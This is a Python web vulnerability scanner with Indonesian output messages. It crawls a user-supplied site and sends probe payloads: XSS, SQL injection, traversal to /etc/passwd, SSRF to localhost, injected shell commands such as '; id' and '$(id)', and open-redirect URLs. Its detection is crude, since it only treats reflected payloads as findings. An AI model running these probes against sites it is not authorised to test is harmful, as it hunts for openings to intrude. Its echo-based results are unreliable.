import requests
import socket
import json
import re
import colorama
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, urlencode, parse_qs
from colorama import Fore, Style

colorama.init(autoreset=True)

def get_website_info(url):
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, "html.parser")
        title = soup.title.string if soup.title else "Unknown"
        server, x_powered_by, ip_address = get_server_info(url)
        
        print(f"{Fore.GREEN}[INFO] URL: {url}")
        print(f"{Fore.GREEN}[INFO] Title: {title}")
        print(f"{Fore.GREEN}[INFO] Server: {server}")
        print(f"{Fore.GREEN}[INFO] X-Powered-By: {x_powered_by}")
        print(f"{Fore.GREEN}[INFO] IP Address: {ip_address}")
        
        return {"url": url, "title": title, "server": server, "ip": ip_address}
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Gagal mendapatkan informasi website: {e}")
        return {}

def get_server_info(url):
    try:
        response = requests.get(url, timeout=5)
        server = response.headers.get("Server", "Unknown")
        x_powered_by = response.headers.get("X-Powered-By", "Unknown")
        parsed_url = urlparse(url)
        ip_address = socket.gethostbyname(parsed_url.netloc)
        return server, x_powered_by, ip_address
    except Exception as e:
        return "Unknown", "Unknown", "Unknown"

def get_subpages(url):
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, "html.parser")
        links = set()
        for link in soup.find_all("a", href=True):
            href = link["href"]
            full_url = urljoin(url, href)
            if urlparse(full_url).netloc == urlparse(url).netloc:
                links.add(full_url)
        print(f"{Fore.YELLOW}[INFO] Ditemukan {len(links)} subhalaman untuk dipindai.")
        return list(links)
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Gagal mendapatkan subhalaman: {e}")
        return []

def test_vulnerability(url, payloads, vuln_type):
    vuln_urls = []
    for payload in payloads:
        try:
            test_url = f"{url}?{urlencode({'q': payload})}"
            response = requests.get(test_url, timeout=5)
            if payload in response.text:
                print(f"{Fore.GREEN}[VULN] {vuln_type} ditemukan di {test_url}")
                vuln_urls.append((test_url, payload, vuln_type))
            else:
                print(f"{Fore.RED}[SAFE] {vuln_type} tidak ditemukan di {test_url}")
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[ERROR] Gagal menguji payload {payload}: {e}")
    return vuln_urls

def detect_vulnerabilities(url):
    vulnerabilities = []
    vulnerabilities.extend(test_vulnerability(url, ['<script>alert(1)</script>', '" onmouseover="alert(1)"'], "XSS"))
    vulnerabilities.extend(test_vulnerability(url, ["' OR '1'='1", '" OR "1"="1"'], "SQL Injection"))
    vulnerabilities.extend(test_vulnerability(url, ["../../etc/passwd", "../../windows/win.ini"], "LFI"))
    vulnerabilities.extend(test_vulnerability(url, ["http://localhost", "http://127.0.0.1"], "SSRF"))
    vulnerabilities.extend(test_vulnerability(url, ["; id", "| whoami", "$(id)"], "RCE"))
    vulnerabilities.extend(test_vulnerability(url, ["/vendor/phpunit/phpunit", "/storage/logs/laravel.log"], "Laravel Debug"))
    vulnerabilities.extend(test_vulnerability(url, ["/kcfinder/browse.php", "/kcfinder/upload.php"], "KCFinder Exposure"))
    vulnerabilities.extend(test_vulnerability(url, ["/redirect?url=https://evil.com", "/out?url=https://phishing.com"], "Open Redirect"))
    return vulnerabilities

def save_results(vulnerabilities, website_info):
    with open("vulnerabilities.txt", "w") as file:
        file.write("Informasi Website:\n")
        file.write(f"URL: {website_info['url']}\n")
        file.write(f"Title: {website_info['title']}\n")
        file.write(f"Server: {website_info['server']}\n")
        file.write(f"IP Address: {website_info['ip']}\n\n")
        
        file.write("Hasil Scan:\n")
        for vuln in vulnerabilities:
            file.write(f"URL: {vuln[0]}\nPayload: {vuln[1]}\nJenis Kerentanan: {vuln[2]}\n\n")
    print(f"{Fore.YELLOW}[INFO] Hasil scan disimpan dalam 'vulnerabilities.txt'")

def main():
    url = input(f"{Fore.CYAN}Masukkan URL target: ")
    if not url.startswith("http"):
        url = "http://" + url
    
    print(f"{Fore.BLUE}\n[SCAN] Mengumpulkan informasi website...")
    website_info = get_website_info(url)
    
    print(f"{Fore.BLUE}\n[SCAN] Memeriksa subhalaman...")
    subpages = get_subpages(url)
    
    all_vulnerabilities = []
    for page in subpages:
        print(f"{Fore.BLUE}\n[SCAN] Memeriksa celah keamanan di {page}...")
        all_vulnerabilities.extend(detect_vulnerabilities(page))
    
    save_results(all_vulnerabilities, website_info)
    
if __name__ == "__main__":
    main()